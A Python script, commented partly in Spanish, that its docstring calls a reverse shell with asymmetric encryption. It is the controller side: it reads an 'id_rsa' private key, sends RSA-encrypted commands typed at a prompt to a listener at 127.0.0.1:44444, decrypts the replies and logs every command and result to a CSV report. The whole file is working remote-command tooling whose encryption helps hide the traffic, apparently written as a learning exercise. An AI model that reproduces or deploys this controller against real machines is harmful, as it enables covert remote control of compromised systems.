#! /usr/bin/python3
# coding=utf-8

"""
Reverse shell + criptografia asimetrica
"""

import socket
from datetime import datetime
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

HOST = "127.0.0.1"
PORT = 44444
llave_priv = open("id_rsa", "r").read()
RESULTS = ""

timestamp = datetime.now()

def write_csv(resultados):
    """
    Function to export the scan results to a CSV file.
    """
    year = str(timestamp.year)
    month = str(timestamp.month)
    day = str(timestamp.day)
    hour = str(timestamp.hour)
    minute = str(timestamp.minute)
    second = str(timestamp.second)

    file_time = year + month + day + hour + minute + second

    with open("shell-report" + file_time + ".csv", "w", encoding='utf-8') as report:
        report.write(resultados)

def cifrado(comando, llave_privada):
    '''
    Cifrar el comando
    param: salida_comando String to be encrypted
    param: llave_publica public key
    return base64 encoded encrypted string
    '''

    rsakey = RSA.importKey(llave_privada)
    rsakey = PKCS1_OAEP.new(rsakey)
    encrypted = rsakey.encrypt(comando)
    return encrypted

def descifrado(salida_comando_cifrado_pub, llave_privada):
    """
    Decifrar el comando
    param: command_cifrado_priv String to be decrypted
    param: llave_privada private key
    return decrypted string
    """

    rsakey = RSA.importKey(llave_privada)
    rsakey = PKCS1_OAEP.new(rsakey)

    decrypted = rsakey.decrypt(salida_comando_cifrado_pub)
    return decrypted

while True:
    command = input(">>: ")
    data = cifrado(command.encode("utf-8"), llave_priv)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as new_socket:
        new_socket.connect((HOST, PORT))
        new_socket.sendall(data)
        data = new_socket.recv(1024)
        data = descifrado(data,llave_priv)
        RESULTS = RESULTS + "\nComando: " + command + "\nResultados:\n" + data.decode('utf-8')
        print(f"Received data: \n{data}")

    write_csv(RESULTS) #export results
